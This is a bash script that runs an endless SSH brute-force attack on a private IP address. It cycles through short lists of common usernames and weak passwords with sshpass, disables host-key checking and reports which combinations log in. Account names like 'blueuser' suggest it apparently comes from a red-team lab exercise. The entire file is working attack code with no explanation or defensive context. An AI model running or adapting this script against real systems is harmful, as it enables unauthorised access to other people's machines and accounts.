#!/bin/bash

TARGET_IP="172.30.0.10"
USERNAMES=("root" "blueuser" "admin" "test")
PASSWORDS=("123456" "password" "bluepass" "admin")

while true; do
  for user in "${USERNAMES[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
      sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -p 22 "$user@$TARGET_IP" "exit" 2>&1
      RESULT=$?
      if [ $RESULT -eq 0 ]; then
        echo "SUCCESS: $user/$pass"
      elif [ $RESULT -eq 5 ]; then
        echo "FAILED: $user/$pass (auth failed)"
      elif [ $RESULT -eq 255 ]; then
        echo "CONNECTION REFUSED or SSH DOWN for $user/$pass"
      else
        echo "OTHER ERROR ($RESULT): $user/$pass"
      fi
      sleep 0.2
    done
  done
done